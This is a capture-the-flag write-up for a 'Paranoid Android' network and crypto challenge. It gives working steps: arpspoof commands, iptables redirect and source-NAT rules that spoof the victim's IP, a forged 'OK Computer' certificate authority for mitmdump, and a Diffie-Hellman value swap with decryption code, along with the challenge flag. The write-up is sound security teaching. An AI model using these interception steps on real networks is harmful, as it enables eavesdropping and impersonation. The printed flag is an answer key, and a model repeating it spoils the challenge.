# Paranoid Android 2

- **Category:** Network / MITM + Crypto (500 pts)
- **Flag:** `0x1337{0x67f20d_p1ea5e_c0u1d_y0u_s70p_th3_n01s3_0x23b690}`
- **Files:** [`files/paranoid_android_2.zip`](files/paranoid_android_2.zip) (contains `recovered_maintenance_fragment.txt`); solve scripts in [`files/`](files/) (`setup.sh`, `addon.py`, `dec.py`).
- **Connect:** `nc 4.193.176.212 3000` (each connection builds a private, isolated segment; resets on disconnect; 30 min max per session).

## Challenge

> A decommissioned relay segment is still up. Every fifteen seconds a paranoid android (unit PA-7) reports in over TLS: it checks the issuer on every certificate, twice. It is paranoid, but not thorough. The king's relay answers every report the same way: clearance=yuppie is of no consequence, and sealed traffic awaits a king.
>
> The incident bundle contains one recovered maintenance fragment (attached). You have been dropped on the segment as a technician unit with a full toolkit (nmap, ping, tcpdump, arpspoof, openssl, mitmdump). Become the unborn chicken voices in the android's head, make the report a king's report, and recover the sealed message.

The whole challenge is Radiohead's *OK Computer* / *Paranoid Android*: the certificate issuer is `OK Computer`, the flag is "please could you stop the noise", and the relay insults you in Paranoid Android lyrics ("you are first against the wall", "of no consequence at all").

### The recovered fragment

```
Unit report cycle (PA-7):
  clearance  <-  http://relay.internal/units/PA-7/clearance
  lease      <-  https://relay.internal/lease    [X-MUX-Auth: CLIMBING_PROTOCOL]
  report     ->  https://relay.internal/core/handoff
                [X-MUX-Sig: HMAC-SHA256(unit_key, route_ticket || clearance)]
                {"ticket": ..., "clearance": ..., "B": "<group 14 public value>"}
  Sealed replies await a king. Yuppies are of no consequence.
  The unit key never leaves the unit.

Margin note (unit firmware 1.9):
  The android checks the issuer on every certificate. Twice.
  The issuer MUST be "OK Computer".
  Chain validation is scheduled for the next album.
  I may be paranoid, but not thorough.

Seal:
  shared = peer_public ** your_private mod p
  key = SHA-256(shared_as_256_big_endian_bytes || route_ticket_ascii || "B3LAY-7Q4M")
  associated data = route_ticket_ascii
```

The fragment is the entire attack spec. Reading it closely gives the four weaknesses:

1. **Clearance is fetched over plaintext HTTP.** We can rewrite the response in transit.
2. **The report signature covers only `route_ticket || clearance`, not `B`.** The DH public value `B` is unauthenticated and malleable.
3. **The TLS check is issuer-only, no chain validation.** A self-signed cert whose issuer is `OK Computer` is accepted.
4. **The seal is textbook Diffie-Hellman.** If we substitute our own `B`, the relay seals the reply to a key we control.

## Recon

The console (`nc ... 3000`) drops you into a shell on a per-session isolated segment:

- Me: `patech@10.66.1.50`
- Android: `PA-7` at `10.66.1.20` (client only; ports closed)
- Relay: `relay.internal` at `10.66.1.10` (ports 80 + 443 open)

Privileges, checked from the shell:

- No root / no sudo, uid 1000.
- `CapEff = 0x3000` = **CAP_NET_ADMIN + CAP_NET_RAW** — enough for raw sockets (arpspoof) and iptables NAT.
- `/proc/sys/net/ipv4/ip_forward = 1` already.
- Toolkit present: `nmap`, `arpspoof`, `tcpdump`, `openssl`, `mitmdump` (12.2.3), `python3` with `cryptography` and `pycryptodome`.

Because everything is on one flat `/24` with no gateway, an ARP-poison man-in-the-middle puts us directly between the android and the relay.

## Solution

### 1. Get in the path (ARP spoof + transparent proxy)

- ARP-poison both directions: `arpspoof -t 10.66.1.20 10.66.1.10` and `arpspoof -t 10.66.1.10 10.66.1.20`.
- Redirect intercepted traffic into mitmproxy with iptables NAT:
  ```
  iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-ports 8080
  iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080
  ```
- Run `mitmdump --mode transparent` on 8080 with a custom addon.

### 2. Beat the paranoid-but-not-thorough TLS check

The android only checks that the certificate *issuer* is `OK Computer`, and never validates the chain. mitmproxy signs on-the-fly leaf certs using its own CA, and a leaf's issuer DN equals the CA's subject DN. So we hand mitmproxy a CA whose subject is `OK Computer`:

```
openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.crt -days 3650 \
  -subj "/O=OK Computer/CN=OK Computer" -addext "basicConstraints=critical,CA:TRUE"
cat ca.key ca.crt > mm/mitmproxy-ca.pem
mitmdump --mode transparent --set confdir=mm -s addon.py
```

Every leaf mitmproxy mints now carries `issuer = O=OK Computer, CN=OK Computer`, which the android accepts.

### 3. Promote the report from yuppie to king

The android fetches its clearance over HTTP (`{"unit":"PA-7","clearance":"yuppie"}`). In the addon we rewrite the response body `yuppie` -> `king`.

Crucially, the android then signs the report itself with its own `unit_key` (which never leaves it) over `route_ticket || clearance`. Because *it* computes the HMAC over the value we injected, the signature is valid for `clearance=king`. We never need the unit key. The relay sees a king report and switches from a plain "of no consequence" answer to a sealed reply.

### 4. Pass the source-IP gate on the lease

First attempt: the lease (`GET /lease`) returned `403 "you are first against the wall ... of no consequence at all"` with `{"registered":["10.66.1.20"],"observed":"10.66.1.50"}`. The relay authorizes the lease by source IP, and our proxy's onward connection came from `10.66.1.50`. Fix with source NAT so the relay sees the android's IP:

```
iptables -t nat -A POSTROUTING -d 10.66.1.10 -p tcp -j SNAT --to-source 10.66.1.20
```

Reply traffic addressed to `.20` comes back to us anyway because the relay's ARP is already poisoned, and conntrack reverses the SNAT. The lease now returns `200` with a `ticket`, and the android proceeds to the handoff.

### 5. Hijack the Diffie-Hellman seal

The report body is `{"ticket", "clearance", "B"}`, where `B` is the android's group-14 (RFC 3526, 2048-bit MODP) DH public value, sent as a decimal string. The signature does **not** cover `B`, so we replace it with our own public value `B' = g^x mod p` (g=2) before forwarding. The relay computes the shared secret against `B'` and seals the reply to a key only we can derive.

The `200` response is:

```json
{"status":"sealed","A":"<relay DH public, decimal>","frame":"<base64>"}
```

Derive the key exactly as the fragment specifies and decrypt. The `frame` is 85 bytes = 12-byte nonce + ciphertext + 16-byte GCM tag, AES-GCM, with the ticket ASCII as associated data:

```python
shared = pow(A, x, P)                          # our private x
key = sha256(shared.to_bytes(256,"big") + ticket_ascii + b"B3LAY-7Q4M").digest()
nonce, ct, tag = frame[:12], frame[12:-16], frame[-16:]
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce); cipher.update(ticket_ascii)
pt = cipher.decrypt_and_verify(ct, tag)
```

Output:

```
0x1337{0x67f20d_p1ea5e_c0u1d_y0u_s70p_th3_n01s3_0x23b690}
```

## Key ideas

- **The fragment is the exploit plan.** Each line maps to a concrete weakness; nothing extra is needed.
- **Issuer-only cert validation is not validation.** A self-signed CA named `OK Computer` defeats the "paranoid" android because it never checks the chain.
- **Signing the wrong bytes.** The HMAC covered `ticket || clearance` but the attacker controls `clearance` upstream (plaintext HTTP) and `B` is outside the signature entirely — so the signed message can be fully steered without ever touching the unit key.
- **Unauthenticated DH public = full seal hijack.** Swapping `B` turns the relay's confidential reply into something we decrypt.
- **MITM plumbing details matter.** The lease's source-IP check would have silently blocked the whole chain; SNAT to the victim's IP (viable because its ARP is already poisoned) fixed it.

## Tooling notes

- `setup.sh` — one-shot: generate the `OK Computer` CA, install the iptables REDIRECT + SNAT rules, launch mitmdump, and start both arpspoof directions.
- `addon.py` — mitmproxy addon: logs every flow, rewrites clearance `yuppie`->`king`, swaps `B` for our group-14 public value, and records the sealed reply.
- `dec.py` — offline decrypt of the captured `A`/`frame`/`ticket` with the stored private key.

The remote shell was driven over a single long-lived `nc` connection (kept open with a FIFO plus a `sleep` holding the write end), since the segment resets the moment the connection drops. Files were pushed to the box by base64-encoding them locally and decoding on the remote side, avoiding heredoc quoting issues through the pseudo-terminal.
